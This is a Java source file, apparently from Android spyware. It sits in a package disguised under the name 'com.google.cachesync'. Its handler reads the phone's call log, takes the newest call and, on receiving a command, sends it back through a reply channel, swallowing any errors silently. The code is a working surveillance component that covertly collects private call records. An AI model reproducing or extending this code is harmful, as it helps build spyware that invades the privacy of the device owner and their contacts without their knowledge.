package com.google.cachesync;

import android.content.Context;
import android.database.Cursor;
import android.os.Handler;
import android.os.Message;
import android.provider.CallLog;


final class handleCallLog extends Handler {
	
	public long lastCall = -1;
	public Context mContext;
	
	public handleCallLog(Context context) {
		mContext = context;
		lastCall = -1;
	}
	
	public void handleMessage(Message msg) {
		CommandObj command = (CommandObj)msg.obj;
		
		Cursor cur= mContext.getContentResolver().query(CallLog.Calls.CONTENT_URI,null, 
				null, null, "date DESC");
		if  ( cur == null || !cur.moveToFirst() ) 
			return;
		CallObj call = new CallObj(cur);
		if ( lastCall >= call.occured )
			return;
		lastCall = call.occured;
		try {
			command.Reply(call);
		} catch (Exception e) {
		}
	}
}
